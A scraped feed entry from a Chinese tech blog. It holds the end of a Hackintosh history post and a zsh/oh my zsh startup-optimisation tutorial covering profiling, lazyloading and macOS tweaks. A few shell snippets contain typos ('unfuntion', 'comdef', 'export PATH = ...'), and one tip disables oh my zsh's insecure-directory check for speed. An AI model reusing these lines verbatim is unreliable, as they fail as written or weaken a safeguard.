9 月 30 日，OS X 10.11 El Capitan 发布，tonymacx86 出品的黑苹果安装工具 UniBeast 将内置的 Bootloader 从变色龙的分支 Chimera 替换为 Clover，正式宣告变色龙寿终正寝。</p>\n<h2>尾声：几个时间</h2>\n<p>截至本文写就，macOS 11.0 Big Sur 已经进入 Public Beta 5，苹果已经宣布未来 Mac 将会从 Intel 切换到 ARM 架构的 Apple Silicon。不少 Hackintosher 都在担心黑苹果的未来。本文就以对几个时间点的探讨作为结尾吧。</p>\n<h3>Clover 用了多久才取代了 Chameleon（变色龙）？</h3>\n<ul>\n<li>2008 年初 Chameleon 发布了首个版本</li>\n<li>2012 年 Clover 发布了首个版本</li>\n<li>2014 年 10 月 17 日 Chameleon 发布了最后一个版本</li>\n</ul>\n<p>Clover 从发布第一个版本发布到取代 Chameleon 只用了 2 年。</p>\n<h3>苹果从 PowerPC 切换到 Intel 用了多久？</h3>\n<ul>\n<li>2005 年 6 月 6 日苹果召开 WWDC 2005，宣布苹果将从 PowerPC 切换到 Intel</li>\n<li>2006 年 1 月 10 日苹果发布了第一台使用 Intel 的 MacBook Pro</li>\n<li>2009 年 8 月 28 日苹果发布了 Mac OS X 10.6 Snow Leopard，正式停止对 PowerPC 的支持。 </li>\n</ul>\n<p>也就是说，苹果从宣布切换到 Intel 到 Mac OS X 放弃 PowerPC 支持用了 4 年。</p>\n<h3>OpenCore 什么时候会取代 Clover？</h3>\n<p>OpenCore 0.0.1 发布于 2019 年 5 月 4 日。如果 Clover 只用了两年就完成了从发布到取代变色龙，那么明年 OpenCore 就会完全取代 Clover（指 Clover 终止开发）。然而抛开历史背景讲历史就是在耍流氓，前面的章节我们看到了变色龙的诸多缺陷（模拟的 UEFI、不支持 GPT 等），被 Clover 取代是必然的。但是现在 Clover 并没有明显的弊端、而 OpenCore 也没有非常显著的优势，加之 Clover 的维护仍然非常活跃，因此在可预见的未来中 Clover 和 OpenCore 仍然会同时存在。</p>\n<h3>苹果什么时候会放弃 Intel 的 x86 架构？</h3>\n<p>这可能是 Hackintosher 们最关心的问题了。如果套用苹果从 PowerPC 切换 Intel 的时间表，那么苹果会在 WWDC 开完后第二年（也就是 2021 年）就会将所有 Mac 切换为 ARM 架构（不再发布搭载 Intel 处理器的 Mac）、而 macOS 则会在三年后（也就是 2024 年）正式放弃对 Intel 处理器的支持。</p>\n<p>但是，现在苹果的策略和 15 年前的还是存在着重大区别 —— WWDC 2005 开完以后，苹果在 2005 年下半年没有再发布任何新 Mac，主要是释出现有的 PowerPC 架构的 Mac 的性能升级（增加运行内存、硬盘扩容等），接着整个 2006 年都没有发布 PowerPC 架构的 Mac、全部产品线都切换到 Intel 架构；而 WWDC 2020 之后，苹果却还是发布了搭载 10 代 Intel 处理器的 27 寸的 iMac 2020。显然，这一次苹果在更换架构这件事上要保守许多，苹果甚至可能在到 2021 年都会发布搭载 Intel 11 代处理器的 Mac。</p>\n<p>另外，我们还可以再列一张关于 macOS 的时间表：</p>\n<ul>\n<li>OS X 10.10 Yosemite 发布于 2014 年 10 月 16 日、兼容 2007 年及以后的 iMac 和 MacBook Pro，最后更新于 2015 年 8 月 15 日。</li>\n<li>OS X 10.11 El Caption 发布于 2015 年 9 月 30 日、兼容 2007 年及以后的 iMac 和 MacBook Pro，最后更新于 2018 年 7 月 9 日。</li>\n<li>macOS 10.12 Sierra 发布于 2016 年 9 月 20 日，兼容 2009 年下半年发布的 iMac 和 MacBook，最后更新于 2019 年 9 月 26 日。</li>\n<li>macOS 10.13 High Sierra 发布于 2017 年 9 月 25 日，兼容 2009 年下半年发布的 iMac 和 MacBook，最后更新于 2019 年 12 月 10 日。</li>\n<li>macOS 10.14 Mojave 发布于 2018 年 9 月 24 日，兼容 2010 年的 iMac Pro 和 2012 年下半年发布的所有 Mac，最后更新于 2019 年 12 月 10 日。</li>\n<li>macOS 10.15 Catalina 发布于 2019 年 10 月 7 日，兼容 2010 年的 iMac Pro 和 2012 年下半年发布的所有 Mac，截至本文写就仍在维护。</li>\n<li>macOS 11.0 Big Sur 于 2020 年 6 月 22 日开始内测，兼容 2013 年上半年发布的 MacBook Air，截至本文写就仍处于公测阶段。</li>\n</ul>\n<p>通过这张时间表可以发现，过去 6 年的每个 macOS 大版本都会兼容至少 7 年以前发布的设备。因此就算苹果从 2021 年开始再也不发布搭载 Intel 处理器的 Mac，macOS 可能也需要到 2025 年才会终止对 Intel 处理器的支持。</p>\n<div class=\"license\"> <div class=\"license-title\">黑苹果的历史</div> <div class=\"license-link\"><a href=\"https://blog.skk.moe/post/history-osx86/\">https://blog.skk.moe/post/history-osx86/</a></div> <div class=\"license-meta\"> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">本文作者</div> <div class=\"license-meta-text\">Sukka</div> </div> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">发布于</div> <div class=\"license-meta-text\">2020-09-02</div> </div>\n<div class=\"license-meta-item\"> <div class=\"license-meta-title\">许可协议</div> <div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div> </div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/history-osx86/"},{"title":"我就感觉到快 —— zsh 和 oh my zsh 冷启动速度优化","date":"2020-08-10 03:59:00","description":"\n<p>不论是在 WSL、Linux 还是 macOS 上，强大的 zsh 一直是我的不二法宝，而 oh my zsh 自然成了最趁手的瑞士军刀，我自己还编写了数个 oh my zsh 插件和主题。直到有一天我突然发现：见鬼，为什么开个 iTerm2 的 Tab 要等上好几秒钟？</p>\n<span></span><h2>zsh 启动耗时测量</h2>\n<p>首先，我们需要一个客观衡量 zsh 启动速度的标准，而使用 macOS 和众多 Linux 发行版中自带的 <code>time</code> 可以轻松计算任何命令的执行用时，包括 shell：</p>\n<pre><code class=\"hljs bash\">$ /usr/bin/time /bin/zsh -i -c <span class=\"hljs-built_in\">exit</span>        1.77 real         1.04 user         0.95 sys</code></pre>\n<p><code>time</code> 输出了 zsh 启动时 user-land 和 system 用时，而我的 zsh 启动用时将近 2 秒钟。为了获得更精确的结果，使用 for 循环连续启动 zsh 5 次：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-keyword\">for</span> i <span class=\"hljs-keyword\">in</span> $(seq 1 5); <span class=\"hljs-keyword\">do</span> /usr/bin/time /bin/zsh -i -c <span class=\"hljs-built_in\">exit</span>; <span class=\"hljs-keyword\">done</span>        1.74 real         1.02 user         0.92 sys        1.69 real         1.00 user         0.90 sys        1.71 real         1.01 user         0.91 sys        1.68 real         0.99 user         0.89 sys        1.74 real         1.02 user         0.93 sys</code></pre>\n<p>为了排除 zsh 本身的性能问题，使用 zsh 的 <code>--no-rcs</code> 参数进行测试：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-keyword\">for</span> i <span class=\"hljs-keyword\">in</span> $(seq 1 20); <span class=\"hljs-keyword\">do</span> /usr/bin/time /bin/zsh --no-rcs -i -c <span class=\"hljs-built_in\">exit</span>; <span class=\"hljs-keyword\">done</span>        0.00 real         0.00 user         0.00 sys        0.00 real         0.00 user         0.00 sys        0.00 real         0.00 user         0.00 sys        0.00 real         0.00 user         0.00 sys        0.00 real         0.00 user         0.00 sys</code></pre>\n<p>不加载 <code>.zshrc</code> 时，zsh 的启动速度是如此的快，以至于 <code>time</code> 给出了 <code>0.00</code> 的结果。</p>\n<h2>Profiling</h2>\n<p>zsh 提供了专门的 profiling 模块 <code>zprof</code> 用于衡量 zsh 各个函数的执行用时。在 <code>.zshrc</code> 文件第一行添加下述命令用于加载 <code>zprof</code> 模块：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># .zshrc</span><span class=\"hljs-built_in\">zmodload</span> zsh/<span class=\"hljs-built_in\">zprof</span></code></pre>\n<p>接着启动 zsh、并使用 <code>zprof</code> 命令获取各函数用时数据：</p>\n<pre><code class=\"hljs bash\">$ /bin/zsh$ <span class=\"hljs-built_in\">zprof</span>num  calls                time                       self            name----------------------------------------------------------------------------------- 1)    1         395.66   395.66   33.10%    395.59   395.59   33.09%  _zsh_nvm_auto_use 2)    1         216.22   216.22   18.09%    216.13   216.13   18.08%  nvm_die_on_prefix 3)    1         648.00   648.00   54.20%    168.85   168.85   14.12%  nvm_auto 4)    2         479.15   239.57   40.08%    160.50    80.25   13.43%  nvm 5)    1         102.30   102.30    8.56%     84.99    84.99    7.11%  nvm_ensure_version_installed 6)    2          51.21    25.60    4.28%     29.55    14.78    2.47%  compinit 7)    1         680.18   680.18   56.89%     22.17    22.17    1.85%  _zsh_nvm_load 8)    2          21.66    10.83    1.81%     21.66    10.83    1.81%  compaudit 9)    1          17.31    17.31    1.45%     17.31    17.31    1.45%  nvm_is_version_installed10)  193          17.43     0.09    1.46%     14.50     0.08    1.21%  _zsh_autosuggest_bind_widget[Redacted]</code></pre>\n<p><code>zprof</code> 模块只能获取每个 zsh 函数的用时，因此适合找出拖累 zsh 冷启动的 oh my zsh 的插件。如果要获取完整的 <code>.zshrc</code> 性能分析，应该使用 <code>xtrace</code>。在 <code>.zshrc</code> 开头添加如下命令：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># .zshrc</span><span class=\"hljs-built_in\">zmodload</span> zsh/datetime<span class=\"hljs-built_in\">setopt</span> PROMPT_SUBSTPS4=<span class=\"hljs-string\">'+$EPOCHREALTIME %N:%i&gt; '</span>logfile=$(mktemp zsh_profile.7Pw1Ny0G)<span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"Logging to <span class=\"hljs-variable\">$logfile</span>\"</span><span class=\"hljs-built_in\">exec</span> 3&gt;&amp;2 2&gt;<span class=\"hljs-variable\">$logfile</span><span class=\"hljs-built_in\">setopt</span> XTRACE</code></pre>\n<p>并在 <code>.zshrc</code> 结尾添加如下命令：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># .zshrc</span><span class=\"hljs-built_in\">unsetopt</span> XTRACE<span class=\"hljs-built_in\">exec</span> 2&gt;&amp;3 3&gt;&amp;-</code></pre>\n<p>这会在 <code>$HOME</code> 目录下生成一个文件名包含随机字符串的文件（<code>zsh_profile.123456</code> ）。一些介绍 zsh profiling 的文章会推荐使用 <a href=\"http://kcachegrind.sourceforge.net/html/Home.html\">kcachegrind</a> 这个工具可视化这个文件，但是我们只需要知道是什么拖累了 zsh 冷启动，将这个文件格式化一下即可。这里提供一个简单的脚本：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-meta\">#!/usr/bin/env zsh</span><span class=\"hljs-built_in\">typeset</span> -a lines<span class=\"hljs-built_in\">typeset</span> -i prev_time=0<span class=\"hljs-built_in\">typeset</span> prev_command<span class=\"hljs-keyword\">while</span> <span class=\"hljs-built_in\">read</span> line; <span class=\"hljs-keyword\">do</span>    <span class=\"hljs-keyword\">if</span> [[ <span class=\"hljs-variable\">$line</span> =~ <span class=\"hljs-string\">'^.*\\+([0-9]{10})\\.([0-9]{6})[0-9]* (.+)'</span> ]]; <span class=\"hljs-keyword\">then</span>        <span class=\"hljs-built_in\">integer</span> this_time=<span class=\"hljs-variable\">$match</span>[1]<span class=\"hljs-variable\">$match</span>[2]        <span class=\"hljs-keyword\">if</span> [[ <span class=\"hljs-variable\">$prev_time</span> -gt 0 ]]; <span class=\"hljs-keyword\">then</span>            time_difference=$(( <span class=\"hljs-variable\">$this_time</span> - <span class=\"hljs-variable\">$prev_time</span> ))            lines+=<span class=\"hljs-string\">\"<span class=\"hljs-variable\">$time_difference</span> <span class=\"hljs-variable\">$prev_command</span>\"</span>        <span class=\"hljs-keyword\">fi</span>        prev_time=<span class=\"hljs-variable\">$this_time</span>        <span class=\"hljs-built_in\">local</span> this_command=<span class=\"hljs-variable\">$match</span>[3]        <span class=\"hljs-keyword\">if</span> [[ <span class=\"hljs-variable\">${#this_command}</span> -le 80 ]]; <span class=\"hljs-keyword\">then</span>            prev_command=<span class=\"hljs-variable\">$this_command</span>        <span class=\"hljs-keyword\">else</span>            prev_command=<span class=\"hljs-string\">\"<span class=\"hljs-variable\">${this_command:0:77}</span>...\"</span>        <span class=\"hljs-keyword\">fi</span>    <span class=\"hljs-keyword\">fi</span><span class=\"hljs-keyword\">done</span> &lt; <span class=\"hljs-variable\">${1:-/dev/stdin}</span><span class=\"hljs-built_in\">print</span> -l <span class=\"hljs-variable\">${(@On)lines}</span></code></pre>\n<p>将上述内容保存在 <code>$HOME</code> 目录下 <code>format_profile.zsh</code> 文件中，然后在终端中执行：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">cd</span> <span class=\"hljs-variable\">$HOME</span>$ chmod +x format_profile.zsh$ ./format_profile.zsh zsh_profile.123456 | head -n 30356910 _zsh_nvm_auto_use:14&gt; [[ none != N/A ]]307791 /Users/sukka/.zshrc:312&gt; hexo <span class=\"hljs-string\">'--completion=zsh'</span>178444 /Users/sukka/.zshrc:310&gt; thefuck --<span class=\"hljs-built_in\">alias</span>161193 nvm_version:21&gt; VERSION=N/A148555 nvm_version:21&gt; VERSION=N/A96497 (<span class=\"hljs-built_in\">eval</span>):4&gt; pyenv <span class=\"hljs-built_in\">rehash</span>58759 /Users/sukka/.zshrc:311&gt; pyenv init -48629 nvm_auto:15&gt; VERSION=<span class=\"hljs-string\">''</span>42779 /Users/sukka/.zshrc:114&gt; FPATH=/usr/<span class=\"hljs-built_in\">local</span>/share/zsh/site-functions:/usr/<span class=\"hljs-built_in\">local</span>...42527 nvm_auto:15&gt; nvm_resolve_local_alias default41620 nvm_resolve_local_alias:7&gt; VERSION=<span class=\"hljs-string\">''</span>35577 nvm_resolve_local_alias:7&gt; VERSION=<span class=\"hljs-string\">''</span>29444 _zsh_nvm_load:6&gt; <span class=\"hljs-built_in\">source</span> /Users/sukka/.nvm/nvm.sh24967 compaudit:154&gt; _i_wfiles=( )24889 nvm_resolve_alias:15&gt; ALIAS_TEMP=<span class=\"hljs-string\">''</span>22000 nvm_auto:18&gt; nvm_rc_version20890 nvm_ls:29&gt; PATTERN=default[Redacted]</code></pre>\n<p>这样就一目了然了。可以看到，除了 <code>nvm</code> 以外、<code>hexo</code> 的自动补全、<code>thefuck</code> 的初始化、<code>pyenv</code> 都大幅拖慢了 zsh 的启动速度。</p>\n<h2>Lazyload</h2>\n<p>你可能听过 <a href=\"https://blog.skk.moe/post/img-lazyload-hexo/\">网页的图片可以 lazyload</a>、<a href=\"https://blog.skk.moe/post/prevent-disqus-from-slowing-your-site/\">Disqus 评论系统可以 lazyload</a>，但是 <code>.zshrc</code> 一样也有 lazyload。lazyload 的特点是启动时快，首次使用时慢，因此很适合用于优化不常用而且初始化非常耗时的功能。</p>\n<p>lazyload 的方法是声明一个占位函数，当执行这个函数时完成对真实命令的初始化、并移除命令占位。以 pyenv 为例：</p>\n<pre><code class=\"hljs sh\"><span class=\"hljs-comment\"># 提前将 .pyenv/shims 添加到 PATH 中，这样即使 pyenv 没有初始化也可以使用 Python</span><span class=\"hljs-built_in\">export</span> PATH=<span class=\"hljs-string\">\"/Users/sukka/.pyenv/shims:<span class=\"hljs-variable\">${PATH}</span>\"</span><span class=\"hljs-function\"><span class=\"hljs-title\">pyenv</span></span>() {  <span class=\"hljs-comment\"># 移除占位函数</span>  unfuntion pyenv  <span class=\"hljs-comment\"># 初始化 pyenv</span>  <span class=\"hljs-built_in\">eval</span> <span class=\"hljs-string\">\"<span class=\"hljs-subst\">$(command pyenv init -)</span>\"</span>  <span class=\"hljs-comment\"># 继续执行 pyenv 命令</span>  pyenv <span class=\"hljs-string\">\"<span class=\"hljs-variable\">$@</span>\"</span>}</code></pre>\n<p>pyenv 在初始化时会自动加载补全（completion），但是由于 lazyload、第一次执行 <code>pyenv</code> 时就没有补全了，因此还需要为补全添加 lazyload：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-function\"><span class=\"hljs-title\">__lazyload_completion_pyenv</span></span>() {  <span class=\"hljs-comment\"># 删除 pyenv 命令补全的占位</span>  comdef -d pyenv  <span class=\"hljs-comment\"># 移除 pyenv 占位函数</span>  <span class=\"hljs-built_in\">unfunction</span> pyenv  <span class=\"hljs-comment\"># 加载真正的 pyenv 命令补全</span>  <span class=\"hljs-built_in\">source</span> <span class=\"hljs-string\">\"<span class=\"hljs-subst\">$(brew --prefix pyenv)</span>/completions/pyenv.zsh\"</span>}compdef __lazyload_completion_pyenv pyenv</code></pre>\n<p>这样，当首次输入 <code>pyenv</code> 并按下 Tab 时会加载 pyenv 的命令补全，第二次按下 Tab 时就可以正常显示命令补全了。</p>\n<p>将上述 lazyload 封装成函数便于调用：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-function\"><span class=\"hljs-title\">sukka_lazyload_add_command</span></span>() {    <span class=\"hljs-built_in\">eval</span> <span class=\"hljs-string\">\"<span class=\"hljs-variable\">$1</span>() { \\</span><span class=\"hljs-string\">        unfunction <span class=\"hljs-variable\">$1</span> \\</span><span class=\"hljs-string\">        _sukka_lazyload__command_<span class=\"hljs-variable\">$1</span> \\</span><span class=\"hljs-string\">        <span class=\"hljs-variable\">$1</span> \\$@ \\</span><span class=\"hljs-string\">    }\"</span>}<span class=\"hljs-function\"><span class=\"hljs-title\">sukka_lazyload_add_completion</span></span>() {    <span class=\"hljs-built_in\">local</span> comp_name=<span class=\"hljs-string\">\"_sukka_lazyload__compfunc_<span class=\"hljs-variable\">$1</span>\"</span>    <span class=\"hljs-built_in\">eval</span> <span class=\"hljs-string\">\"<span class=\"hljs-variable\">${comp_name}</span>() { \\</span><span class=\"hljs-string\">        compdef -d <span class=\"hljs-variable\">$1</span>; \\</span><span class=\"hljs-string\">        _sukka_lazyload_completion_<span class=\"hljs-variable\">$1</span>; \\</span><span class=\"hljs-string\">    }\"</span>    compdef <span class=\"hljs-variable\">$comp_name</span> <span class=\"hljs-variable\">$1</span>}</code></pre>\n<p>使用封装好的 lazyload 函数添加 <code>pyenv</code> 和 <code>thefuck</code> 的 lazyload、Hexo completion 的 lazyload：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-function\"><span class=\"hljs-title\">_sukka_lazyload__command_pyenv</span></span>() {  <span class=\"hljs-comment\"># pyenv 初始化</span>  <span class=\"hljs-built_in\">eval</span> <span class=\"hljs-string\">\"<span class=\"hljs-subst\">$(command pyenv init -)</span>\"</span>}<span class=\"hljs-function\"><span class=\"hljs-title\">_sukka_lazyload__compfunc_pyenv</span></span>() {  <span class=\"hljs-comment\"># pyenv 命令补全</span>  <span class=\"hljs-built_in\">source</span> <span class=\"hljs-string\">\"<span class=\"hljs-subst\">$(brew --prefix pyenv)</span>/completions/pyenv.zsh\"</span>}<span class=\"hljs-comment\"># 添加 pyenv 的 lazyload</span>sukka_lazyload_add_command pyenvsukka_lazyload_add_completion pyenv<span class=\"hljs-function\"><span class=\"hljs-title\">_sukka_lazyload__command_fuck</span></span>() {  <span class=\"hljs-comment\"># fuck 初始化</span>  <span class=\"hljs-built_in\">eval</span> $(thefuck --<span class=\"hljs-built_in\">alias</span>)}<span class=\"hljs-comment\"># 添加 fuck 的 lazyload</span>sukka_lazyload_add_command fuck<span class=\"hljs-function\"><span class=\"hljs-title\">_sukka_lazyload__completion_hexo</span></span>() {  <span class=\"hljs-comment\"># hexo 的 completion</span>  <span class=\"hljs-built_in\">eval</span> $(hexo --completion=zsh)}<span class=\"hljs-comment\"># 添加 hexo completion 的 lazyload</span>sukka_lazyload_add_completion hexo</code></pre>\n<h2>替换 NVM</h2>\n<p>我使用 nvm 的方式是 <code>zsh-nvm</code> 插件。由于我的开发环境也高度依赖 <code>.nvmrc</code> 文件，所以不得不启用 nvm auto use。由于我的许多工具高度依赖 Node.js（如我的 <a href=\"https://nali.skk.moe/\">Nali CLI</a>），lazyload nvm 也是不现实的。我不得不寻找另一个代替 nvm 的 Node.js 版本管理器，最后我选中了 <a href=\"https://github.com/tj/n\"><code>tj/n</code></a>。</p>\n<p>首先是卸载 nvm、nvm 安装的所有 Node.js 版本、以及 zsh-nvm 插件：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># 卸载 nvm 及其安装的 Node.js</span>$ rm -rf <span class=\"hljs-variable\">$HOME</span>/.nvm<span class=\"hljs-comment\"># 删除 zsh-nvm 插件</span>$ rm -rf <span class=\"hljs-variable\">$ZSH</span>/custom/plugins/zsh-nvm<span class=\"hljs-comment\"># 除了删除目录，还需要在 .zshrc 中的 plugins 数组中删除 zsh-nvm</span></code></pre>\n<p>接着安装 <code>tj/n</code> 作为 Node.js 版本管理器，macOS 上可以通过 Homebrew 直接安装：</p>\n<pre><code class=\"hljs bash\">$ brew install n</code></pre>\n<p>在 <code>.zshrc</code> 中配置 <code>tj/n</code>：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># tj/n 的路径</span><span class=\"hljs-built_in\">export</span> N_PREFIX=<span class=\"hljs-string\">\"<span class=\"hljs-variable\">$HOME</span>/.n\"</span><span class=\"hljs-comment\"># 当切换 Node.js 版本时保留 npm</span><span class=\"hljs-built_in\">export</span> N_PRESERVE_NPM=1<span class=\"hljs-comment\"># 将 tj/n 添加到 PATH</span><span class=\"hljs-built_in\">export</span> PATH = <span class=\"hljs-string\">\"<span class=\"hljs-variable\">$N_PREFIX</span>/bin:<span class=\"hljs-variable\">$PATH</span>\"</span></code></pre>\n<h2>使用 zsh 内置语法</h2>\n<p>zsh 强大之处不仅在于内建的插件、优雅的使用方式，更重要的是极其强大的语法。在 <code>.zshrc</code> 广泛使用 zsh 内置的语法可以大幅提高执行性能。</p>\n<h3>zsh 判断命令是否存在</h3>\n<p>我们经常需要在 <code>.zshrc</code> 之中编写命令是否存在的条件语句，比如「仅当命令存在时加载该命令的自动补全」，或者「当 Node.js 存在时输出 Node.js 版本」。通常情况下我们会写出以下三种条件判断方式：</p>\n<pre><code class=\"hljs bash\">[[ <span class=\"hljs-built_in\">command</span> -v node &amp;&gt;/dev/null ]] &amp;&amp; node -v[[ <span class=\"hljs-built_in\">which</span> -a node &amp;&gt;/dev/null ]] &amp;&amp; node -v[[ <span class=\"hljs-built_in\">type</span> node &amp;&gt;/dev/null ]] &amp;&amp; node -v</code></pre>\n<p>但是在 zsh 中，还有一种速度更快的判断命令存在的方法：</p>\n<pre><code class=\"hljs bash\">(( $+commands[node] )) &amp;&amp; node -v</code></pre>\n<p>zsh 提供了一个数组元素查找语法 <code>$+array[item]</code> （元素存在则返回 1 否则返回 0），同时 zsh 也维护了一个命令数组 <code>$commands</code>，在数组中检索元素比调用 <code>which</code>、<code>type</code>、<code>command -v</code> 命令都要快许多。</p>\n<h3>变量字符串查找</h3>\n<p>在 <code>.zshrc</code> 中鲜少需要用到这样的语法，不过依然存在一些 case，比如为了避免向 <code>$FPATH</code> 中重复添加 Homebrew 的自动补全，提前检查 <code>$FPATH</code> 中是否已经包含了 Homebrew 的路径。一般常见的写法都涉及到 <code>echo</code> 和 <code>grep</code> ：</p>\n<pre><code class=\"hljs bash\">[[ $(<span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">$FPATH</span> | grep <span class=\"hljs-string\">\"/usr/local/share/zsh/site-functions\"</span>) ]] &amp;&amp; <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"homebrew exists in fpath\"</span></code></pre>\n<p>但是在 zsh 中我们不需要 <code>grep</code> 也可以实现同样的功能：</p>\n<pre><code class=\"hljs bash\">(( <span class=\"hljs-variable\">$FPATH</span>[(I)/usr/<span class=\"hljs-built_in\">local</span>/share/zsh/site-functions] )) &amp;&amp; <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"homebrew exists in fpath\"</span></code></pre>\n<p>zsh 内置了在变量中匹配字符串的语法：<code>$variable[(i)keyword]</code> 和 <code>$variable[(I)keyword]</code>，前者是从左往右寻找、后者是从右往左寻找，返回值为第一个匹配的首字符位置，当没有匹配时返回值则是变量的最终位置，也就是说当找不到匹配时 <code>(i)</code> 会返回字符串的长度、而 <code>(I)</code> 会返回 0。因此只需要从右往左寻找、判断返回值是否为 0 即可，搭配将数字转化为布尔值的 <code>(( ))</code> 就可以写出又快又漂亮的条件语句。</p>\n<h3>变量字符串替换</h3>\n<p>当需要截断或者替换字符串时，大部分人第一时间会想到 <code>sed</code> ，因当此需要替换变量中的字符时自然而然的会使用 <code>echo | sed</code>。比如，在 macOS 中主机名 <code>$HOST</code> 变量通常以 <code>.local</code> 结尾：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">$HOST</span>Sukka-MBP.local</code></pre>\n<p>如果要显示 <code>Sukka-MBP</code> （在 prompt 中常常会用到）就需要写成：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">$HOST</span> | sed -e <span class=\"hljs-string\">\"s/.local//\"</span>Sukka-MBP</code></pre>\n<p>但是，强大的 zsh 内置了简单的变量字符串替换语法，使用下述命令可以达到相同的效果：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">${HOST/.local/}</span>Sukka-MBP$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">${HOST/.local/.foxtail}</span>Sukka-MBP.foxtail</code></pre>\n<h2>其它优化手段</h2>\n<h3>禁用多余的插件</h3>\n<p>oh my zsh 在 Wiki 里说「Add wisely, as too many plugins slow down shell startup」。通过 profiling 可以发现一些插件（如 <code>git</code> 插件）执行耗时也不短。考虑到 oh my zsh 内置的 <code>git</code> 插件只是一些 alias、大部分我都用不到，因此将其从 <code>plugins</code> 数组中移除。</p>\n<h3>避免产生子进程</h3>\n<p>在 shell 中有不少语法会产生子进程。由于这些不受控制的子进程可能会产生其它子进程、从而导致潜在的巨大开销。常见的会产生子进程的语法有是 <code>eval</code> 和 Command substitution，在编写 <code>.zshrc</code> 时应该尽量避免使用它们。</p>\n<p>例如，Homebrew 是通过 Ruby —— 一种没有性能优势的语言编写的，而且 Homebrew 的开发者甚至因为不会翻转二叉树而错失了 Google 的 offer（想必大家大体可以猜得出 Homebrew 中的负优化），因此在 zsh 启动时产生一个子进程运行 Homebrew 将是不能忍受的，绝大部分使用 Homebrew 的人都不会改变 Homebrew 的路径，因此与其在 <code>.zshrc</code> 中使用 <code>$(brew --prefix)</code>，不如直接将命令执行的结果（<code>/usr/local</code>）直接写在 <code>.zshrc</code> 中。</p>\n<h3>启用 ZSH_DISABLE_COMPFIX</h3>\n<p>oh my zsh 内置了安全功能、避免 oh my zsh 插件使用不安全的目录和文件，但是这意味着插件在加载时需要通过一系列 security checker。通过禁用安全功能 （<code>export ZSH_DISABLE_COMPFIX=\"true\"</code>）可以使 zsh 启动速度加快 0.06s。微不足道，但值得一试。</p>\n<h2>针对 macOS 的优化</h2>\n<h3>path_helper</h3>\n<p>和 Linux 不同，在 macOS 上 zsh 启动序列的第一项为 <code>/etc/zprofile</code> 而不是 <code>~/.zprofile</code>。macOS 通过 <code>/etc/zprofile</code> 来调用 <code>path_helper</code>：</p>\n<pre><code class=\"hljs bash\">$ cat /etc/zprofile<span class=\"hljs-comment\"># System-wide .profile for sh(1)</span><span class=\"hljs-keyword\">if</span> [ -x /usr/libexec/path_helper ]; <span class=\"hljs-keyword\">then</span>  <span class=\"hljs-built_in\">eval</span> `/usr/libexec/path_helper -s`<span class=\"hljs-keyword\">fi</span><span class=\"hljs-keyword\">if</span> [ <span class=\"hljs-string\">\"<span class=\"hljs-variable\">${BASH-no}</span>\"</span> != <span class=\"hljs-string\">\"no\"</span> ]; <span class=\"hljs-keyword\">then</span>  [ -r /etc/bashrc ] &amp;&amp; . /etc/bashrc<span class=\"hljs-keyword\">fi</span></code></pre>\n<p>而 <code>path_helper</code> 又会读取 <code>/etc/paths</code> 、<code>/etc/paths/d</code>、<code>etc/manpaths</code> 和  <code>etc/manpaths.d</code>、并将其添加到 <code>$PATH</code> 和 <code>$MANPATH</code> 变量中。通过 <code>path_helper</code> macOS 提供了一种快速在不同 shell 中共享  <code>$PATH</code> 和 <code>$MANPATH</code> 的方法。过去，<code>path_helper</code> 是一个 <a href=\"https://mjtsai.com/blog/2009/04/01/slow-opening-terminal-windows\">运行速度很慢的 shell 脚本</a> 以至于有人制作了 <a href=\"https://gist.github.com/mkhl/123525\">专门的 patch</a>、甚至 <a href=\"https://github.com/mgprot/path_helper\">使用 Perl</a> 重写了一个替代品。不过 macOS 意识到了这个问题，现在 <code>path_helper</code> 不再是一个脚本而是一个预编译好的二进制文件。如果你通过 profiling 发现 <code>path_helper</code> 有在拖累 zsh 启动，那么可以考虑放弃使用 <code>/etc/paths/d</code>、而是在 <code>.zshrc</code> 中直接维护 <code>$PATH</code>。</p>\n<h3>login process</h3>\n<p>默认在启动、终端登陆 shell 时会触发 macOS 的 <code>login -fp username</code>。这一操作会调用 <code>syslog()</code> 函数向 <code>/var/log/asl</code> 写入日志、并读取上一次登录记录、以 <code>Last login</code> 的形式显示出来。你可以使用下述命令证实这一行为：</p>\n<pre><code class=\"hljs bash\">ps -ef | grep login</code></pre>\n<p>如果想要通过减少日志写入来加快 zsh 启动速度，可以修改 <code>etc/asl.conf</code> 配置文件中定义的日志等级。</p>\n<p>不少文章也提到，修改 iTerm2 设置中的 <code>Login Command</code> 为 <code>/bin/zsh</code> 可以加快 zsh 启动速度，本质上也是绕过了上述读取和写入日志的环节。</p>\n<blockquote><p>ASL 即 <strong>A</strong>pple <strong>S</strong>ystem <strong>L</strong>og，macOS 10.12 